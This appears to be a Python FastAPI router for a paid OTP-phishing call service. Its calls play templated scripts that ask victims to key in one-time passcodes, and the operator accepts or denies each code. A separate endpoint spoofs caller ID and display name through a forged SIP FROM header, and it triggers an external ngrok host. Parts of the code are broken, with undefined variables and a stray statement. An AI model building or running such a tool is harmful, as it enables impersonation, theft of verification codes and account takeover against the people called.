from fastapi import APIRouter, HTTPException, Depends, Request
from models.schemas import CallCreate, SpoofCallCreate, CallResponse, CallControl
from services.mongodb_service import MongoDBService
from services.signalwire_service import SignalWireService
from services.infobip_service import InfobipService
from services.infobip_sip_service import InfobipSIPService
from services.telegram_service import TelegramService
from services.websocket_manager import manager
from utils.auth_middleware import verify_token, verify_admin
from typing import List
from datetime import datetime
import logging
import os

logger = logging.getLogger(__name__)
router = APIRouter(prefix="/calls", tags=["Calls"])

signalwire = SignalWireService()
infobip = InfobipService()
infobip_sip = InfobipSIPService()
telegram = TelegramService()

# Store active calls in memory (in production, use Redis)
active_calls = {}

@router.post("/start", response_model=CallResponse)
async def start_call(call_data: CallCreate, current_user: dict = Depends(verify_token)):
    """Start a new call"""
    try:
        # Get cost configuration - FLAT RATE per call
        flat_cost_per_call = float(os.getenv('CALL_COST_PER_MINUTE', '0.5'))
        
        # Check user balance (need flat cost)
        if current_user['balance'] < flat_cost_per_call:
            raise HTTPException(
                status_code=402, 
                detail=f"Insufficient balance. Need ${flat_cost_per_call} per call."
            )
        
        # Deduct FLAT cost immediately (no reserve, direct charge)
        new_balance = current_user['balance'] - flat_cost_per_call
        await MongoDBService.update_user_balance(current_user['uid'], new_balance)
        
        logger.info(f"💰 Charged FLAT ${flat_cost_per_call} from user {current_user['uid']} balance. New balance: ${new_balance}")
        
        # Replace variables in messages (support both {var} and {{var}})
        def replace_vars(text):
            return (text
                .replace('{{name}}', call_data.recipient_name).replace('{name}', call_data.recipient_name)
                .replace('{{service}}', call_data.service_name).replace('{service}', call_data.service_name)
                .replace('{{digit}}', str(call_data.digits)).replace('{digit}', str(call_data.digits))
            )
        
        step_1_message = replace_vars(call_data.step_1_message)
        step_2_message = replace_vars(call_data.step_2_message)
        step_3_message = replace_vars(call_data.step_3_message)
        accepted_message = replace_vars(call_data.accepted_message)
        rejected_message = replace_vars(call_data.rejected_message)
        
        # Create call log in Firestore with EXACT text from UI form
        call_log = {
            'user_id': current_user['uid'],
            'from_number': call_data.from_number,
            'to_number': call_data.to_number,
            'recipient_name': call_data.recipient_name,
            'service_name': call_data.service_name,
            'call_type': call_data.call_type,
            'status': 'initiated',
            'tts_voice': call_data.tts_voice,
            'language': call_data.language,
            'step_1_message': step_1_message,
            'step_2_message': step_2_message,
            'step_3_message': step_3_message,
            'accepted_message': accepted_message,
            'rejected_message': rejected_message,
            'digits': call_data.digits,
            # Billing info - FLAT RATE
            'flat_cost_per_call': flat_cost_per_call,
            'charged_amount': flat_cost_per_call,
            'billing_status': 'charged'  # Immediately charged, no reserve
        }
        
        call_log = await MongoDBService.create_call_log(call_log)
        call_id = call_log['call_id']
        
        # CRITICAL FIX: Verify call is saved before proceeding
        import asyncio
        await asyncio.sleep(0.2)  # Wait 200ms for DB write confirmation
        
        # Verify call exists in DB
        verify_call = await MongoDBService.get_call(call_id)
        if not verify_call:
            logger.error(f"Call {call_id} not found in DB after creation - retrying save")
            await MongoDBService.create_call_log(call_log)
            await asyncio.sleep(0.1)
        
        # Store call data
        active_calls[call_id] = call_log
        
        # Use INTERNAL webhooks for ALL providers
        backend_url = os.getenv('BACKEND_URL', 'https://lanjutkan-ini.preview.emergentagent.com')
        
        if call_data.provider == "infobip":
            callback_url = f"{backend_url}/api/webhooks/infobip/{call_id}"
            status_callback_url = f"{backend_url}/api/webhooks/infobip/{call_id}/status"
            logger.info(f"Using INTERNAL webhooks for Infobip call {call_id}")
        else:
            # Use INTERNAL webhooks for SignalWire
            callback_url = f"{backend_url}/api/webhooks/signalwire/{call_id}"
            status_callback_url = f"{backend_url}/api/webhooks/signalwire/{call_id}/status"
            logger.info(f"Using INTERNAL webhooks for SignalWire call {call_id}")
        
        logger.info(f"Callback URL: {callback_url}")
        
        # Initiate call based on provider
        if call_data.provider == "infobip":
            provider_response = await infobip.make_call(
                from_number=call_data.from_number,
                to_number=call_data.to_number,
                callback_url=callback_url,
                status_callback_url=status_callback_url
            )
        else:  # signalwire
            provider_response = await signalwire.make_call(
                from_number=call_data.from_number,
                to_number=call_data.to_number,
                callback_url=callback_url,
                status_callback_url=status_callback_url
            )
        
        if not provider_response:
            raise HTTPException(status_code=500, detail=f"Failed to initiate call via {call_data.provider}")
        
        # Send event to user via WebSocket
        event = {
            'time': datetime.utcnow().isoformat(),
            'event': 'call_initiated',
            'data': {'call_id': call_id}
        }
        
        await MongoDBService.update_call_events(call_id, event)
        await manager.send_to_user(current_user['uid'], {
            'type': 'call_event',
            'call_id': call_id,
            'event': event
        })
        
        # Send Telegram notification (optional, don't block on error)
        try:
            await telegram.send_call_notification(call_log)
        except Exception as e:
            logger.warning(f"Failed to send Telegram notification: {e}")
        
        return CallResponse(**call_log)
    
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Error starting call: {e}")
        raise HTTPException(status_code=500, detail="Failed to start call")

@router.get("/history", response_model=List[CallResponse])
async def get_call_history(current_user: dict = Depends(verify_token)):
    """Get user's call history"""
    if current_user['role'] == 'admin':
        calls = await MongoDBService.get_all_calls()
    else:
        calls = await MongoDBService.get_user_calls(current_user['uid'])
    
    return [CallResponse(**call) for call in calls]

@router.get("/{call_id}", response_model=CallResponse)
async def get_call(call_id: str, current_user: dict = Depends(verify_token)):
    """Get specific call details"""
    # Get call from MongoDB
    call_data = await MongoDBService.get_call(call_id)
    
    if not call_data:
        raise HTTPException(status_code=404, detail="Call not found")
    
    # Security: Check if user owns this call or is admin
    if current_user['role'] != 'admin' and call_data.get('user_id') != current_user['uid']:
        raise HTTPException(status_code=403, detail="Access denied")
    
    return CallResponse(**call_data)

@router.post("/{call_id}/control")
async def control_call(call_id: str, control: CallControl, current_user: dict = Depends(verify_token)):
    """Control active call (accept/reject/end)"""
    # Get call from MongoDB
    call_data = await MongoDBService.get_call(call_id)
    
    if not call_data:
        raise HTTPException(status_code=404, detail="Call not found")
    
    # Security: Check if user owns this call or is admin
    if current_user['role'] != 'admin' and call_data.get('user_id') != current_user['uid']:
        raise HTTPException(status_code=403, detail="Access denied")
    
    # Send control event via WebSocket
    event = {
        'time': datetime.utcnow().isoformat(),
        'event': f'call_{control.action}',
        'data': {'action': control.action, 'message': control.message}
    }
    
    await MongoDBService.update_call_events(call_id, event)
    
    # Update call status
    await MongoDBService.update_call_status(call_id, control.action)
    
    await manager.send_to_user(call_data['user_id'], {
        'type': 'call_event',
        'call_id': call_id,
        'event': event
    })
    
    return {"message": f"Call {control.action} command sent", "call_id": call_id}

@router.post("/{call_id}/hangup")
async def hangup_call(call_id: str, current_user: dict = Depends(verify_token)):
    """Terminate/hangup an active call"""
    try:
        # Get call from MongoDB
        call_data = await MongoDBService.get_call(call_id)
        
        if not call_data:
            raise HTTPException(status_code=404, detail="Call not found")
        
        # Security: Check if user owns this call or is admin
        if current_user['role'] != 'admin' and call_data.get('user_id') != current_user['uid']:
            raise HTTPException(status_code=403, detail="Access denied")
        
        # Try to hangup via SignalWire if call is still active
        if call_data.get('signalwire_call_id'):
            try:
                await signalwire.hangup_call(call_data['signalwire_call_id'])
                logger.info(f"Call {call_id} terminated via SignalWire")
            except Exception as e:
                logger.warning(f"Failed to hangup via SignalWire: {e}")
        
        # Update call status in MongoDB
        await MongoDBService.update_call_status(call_id, 'terminated')
        await MongoDBService.update_call_field(call_id, 'ended_at', datetime.utcnow().isoformat())
        
        # Send event via WebSocket
        event = {
            'time': datetime.utcnow().isoformat(),
            'event': 'call_terminated',
            'data': {'call_id': call_id, 'terminated_by': 'user'}
        }
        
        await MongoDBService.update_call_events(call_id, event)
        await manager.send_to_user(call_data['user_id'], {
            'type': 'call_event',
            'call_id': call_id,
            'event': event
        })
        
        return {"message": "Call terminated successfully", "call_id": call_id}
    
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Error hanging up call: {e}")
        raise HTTPException(status_code=500, detail="Failed to hangup call")

@router.post("/{call_id}/accept")
async def accept_otp(call_id: str, current_user: dict = Depends(verify_token)):
    """Accept OTP - Play accepted message and end call"""
    try:
        # Get call from MongoDB
        call_data = await MongoDBService.get_call(call_id)
        
        if not call_data:
            raise HTTPException(status_code=404, detail="Call not found")
        
        # Security: Check if user owns this call or is admin
        if current_user['role'] != 'admin' and call_data.get('user_id') != current_user['uid']:
            raise HTTPException(status_code=403, detail="Access denied")
        
        # Set admin decision to accept
        await MongoDBService.update_call_field(call_id, 'admin_decision', 'accept')
        await MongoDBService.update_call_status(call_id, 'otp_accepted')
        
        # Create event
        event = {
            'time': datetime.utcnow().isoformat(),
            'event': 'otp_accepted',
            'message': '✅ OTP Accepted by admin',
            'data': {'decision': 'accept'}
        }
        
        await MongoDBService.update_call_events(call_id, event)
        await manager.send_to_user(call_data['user_id'], {
            'type': 'call_event',
            'call_id': call_id,
            'event': event
        })
        
        logger.info(f"OTP accepted for call {call_id} by user {current_user['uid']}")
        
        return {"message": "OTP accepted successfully", "call_id": call_id}
    
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Error accepting OTP: {e}")
        raise HTTPException(status_code=500, detail="Failed to accept OTP")

@router.post("/{call_id}/deny")
async def deny_otp(call_id: str, current_user: dict = Depends(verify_token)):
    """Deny OTP - Play rejected message and ask for code again"""
    try:
        # Get call from MongoDB
        call_data = await MongoDBService.get_call(call_id)
        
        if not call_data:
            raise HTTPException(status_code=404, detail="Call not found")
        
        # Security: Check if user owns this call or is admin
        if current_user['role'] != 'admin' and call_data.get('user_id') != current_user['uid']:
            raise HTTPException(status_code=403, detail="Access denied")
        
        # Set admin decision to deny
        await MongoDBService.update_call_field(call_id, 'admin_decision', 'deny')
        await MongoDBService.update_call_status(call_id, 'otp_denied')
        
        # Create event
        event = {
            'time': datetime.utcnow().isoformat(),
            'event': 'otp_denied',
            'message': '❌ OTP Denied by admin',
            'data': {'decision': 'deny'}
        }
        
        await MongoDBService.update_call_events(call_id, event)
        await manager.send_to_user(call_data['user_id'], {
            'type': 'call_event',
            'call_id': call_id,
            'event': event
        })
        
        logger.info(f"OTP denied for call {call_id} by user {current_user['uid']}")
        
        return {"message": "OTP denied successfully", "call_id": call_id}
    
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Error denying OTP: {e}")
        raise HTTPException(status_code=500, detail="Failed to deny OTP")


@router.post("/spoof/start")
async def start_spoofed_call(call_data: SpoofCallCreate, current_user: dict = Depends(verify_token)):
    """Initiate a spoofed call via SIP Direct (External SIP client will fetch params)"""
    try:
        # CHECK SPOOFING PERMISSION
        if not current_user.get('can_use_spoofing', False):
            raise HTTPException(
                status_code=403, 
                detail="Access denied. You don't have permission to use spoofing feature. Contact admin."
            )
        
        # Get spoofing cost configuration - FLAT RATE per call
        flat_spoofing_cost = float(os.getenv('SPOOFING_COST_PER_MINUTE', '0.8'))
        
        # Check user balance (need flat cost)
        if current_user['balance'] < flat_spoofing_cost:
            raise HTTPException(
                status_code=402, 
                detail=f"Insufficient balance. Need ${flat_spoofing_cost} per spoofing call."
            )
        
        # Deduct FLAT cost immediately (no reserve, direct charge)
        new_balance = current_user['balance'] - flat_spoofing_cost
        await MongoDBService.update_user_balance(current_user['uid'], new_balance)
        
        logger.info(f"💰 Charged FLAT ${flat_spoofing_cost} (SPOOFING) from user {current_user['uid']} balance. New balance: ${new_balance}")
        
        # Replace variables in messages
        def replace_vars(text):
            return (text
                .replace('{{name}}', call_data.recipient_name).replace('{name}', call_data.recipient_name)
                .replace('{{service}}', call_data.service_name).replace('{service}', call_data.service_name)
                .replace('{{digit}}', str(call_data.digits)).replace('{digit}', str(call_data.digits))
            )
        
        step_1_message = replace_vars(call_data.step_1_message)
        step_2_message = replace_vars(call_data.step_2_message)
        step_3_message = replace_vars(call_data.step_3_message)
        accepted_message = replace_vars(call_data.accepted_message)
        rejected_message = replace_vars(call_data.rejected_message)
        
        # Create call log
        call_log = {
            'user_id': current_user['uid'],
            'from_number': call_data.from_number,
            'to_number': call_data.to_number,
            'spoofed_caller_id': call_data.spoofed_caller_id,
            'from_display_name': call_data.from_display_name,
            'recipient_name': call_data.recipient_name,
            'service_name': call_data.service_name,
            'call_type': 'spoof',
            'provider': 'sip_direct',
            'status': 'pending',
            'tts_voice': call_data.tts_voice,
            'language': call_data.language,
            'step_1_message': step_1_message,
            'step_2_message': step_2_message,
            'step_3_message': step_3_message,
            'accepted_message': accepted_message,
            'rejected_message': rejected_message,
            'digits': call_data.digits,
            # Billing info for spoofing
            'cost_per_minute': spoofing_cost_per_minute,
            'estimated_cost': estimated_cost,
            'reserved_amount': estimated_cost,
            'actual_cost': 0,
            'billing_status': 'reserved',
            'sip_domain': os.getenv('INFOBIP_SIP_DOMAIN', '81.23.254.103'),
            'sip_port': int(os.getenv('INFOBIP_SIP_PORT', '5061'))
        }
        
        call_log = await MongoDBService.create_call_log(call_log)
        call_id = call_log['call_id']
        active_calls[call_id] = call_log
        
        logger.info(f"SIP Spoofed call created: {call_id}")
        logger.info(f"Spoofed: {call_data.spoofed_caller_id} ({call_data.from_display_name}) -> {call_data.to_number}")
        
        # Auto-trigger external SIP client via ngrok webhook
        try:
            external_webhook = "https://piddly-tenable-frederic.ngrok-free.dev/sip-trigger.php"
            trigger_url = f"{external_webhook}?call_id={call_id}"
            
            import httpx
            async with httpx.AsyncClient(timeout=5.0) as client:
                response = await client.get(trigger_url)
                if response.status_code == 200:
                    logger.info(f"External SIP client triggered successfully for {call_id}")
                    # Update call status in MongoDB
                    await MongoDBService.update_call_status(call_id, 'initiated')
                else:
                    logger.warning(f"Failed to trigger external SIP client: {response.status_code}")
        except Exception as e:
            logger.error(f"Error triggering external SIP client: {e}")
            logger.info(f"Manual trigger: GET /api/calls/sip/{call_id}/params")
        
        # Return proper CallResponse format
        return {
            "success": True,
            "message": "Spoofed call initiated. Check your phone!",
            "call_id": call_id,
            "user_id": current_user['uid'],
            "from_number": call_data.from_number,
            "to_number": call_data.to_number,
            "recipient_name": call_data.recipient_name,
            "service_name": call_data.service_name,
            "call_type": "spoof",
            "status": "initiated",
            "provider": "sip_direct",
            "events": [],
            "created_at": call_log.get('created_at', datetime.utcnow().isoformat())
        }
        
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Error starting spoofed call: {e}")
        raise HTTPException(status_code=500, detail=str(e))

@router.get("/sip/{call_id}/params")
async def get_sip_params(call_id: str):
    """Get SIP parameters for external SIP client to make spoofed call"""
    try:
        call_data = await MongoDBService.get_call(call_id)
        
        if not call_data:
            raise HTTPException(status_code=404, detail="Call not found")
        backend_url = os.getenv('BACKEND_URL', 'https://lanjutkan-ini.preview.emergentagent.com')
        
        # Return SIP parameters for external client
        return {
            "call_id": call_id,
            "sip_config": {
                "sip_domain": call_data.get('sip_domain', '81.23.254.103'),
                "sip_port": call_data.get('sip_port', 5061),
                "transport": "TLS",
                "auth_method": "IP-based"
            },
            "call_params": {
                "from_number": call_data.get('from_number'),
                "to_number": call_data.get('to_number'),
                "spoofed_caller_id": call_data.get('spoofed_caller_id'),
                "from_display_name": call_data.get('from_display_name')
            },
            "webhooks": {
                "voice_url": f"{backend_url}/api/webhooks/infobip/{call_id}",
                "status_url": f"{backend_url}/api/webhooks/infobip/{call_id}/status"
            },
            "instructions": {
                "step1": "Make SIP INVITE to sip_domain:sip_port",
                "step2": "Set FROM header: '{from_display_name}' <sip:{spoofed_caller_id}@{sip_domain}>",
                "step3": "After call connects, fetch TTS from voice_url",
                "step4": "Send status updates to status_url"
            }
        }
        
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Error getting SIP params: {e}")
        raise HTTPException(status_code=500, detail="Failed to get SIP parameters")

        raise HTTPException(status_code=500, detail="Failed to terminate call")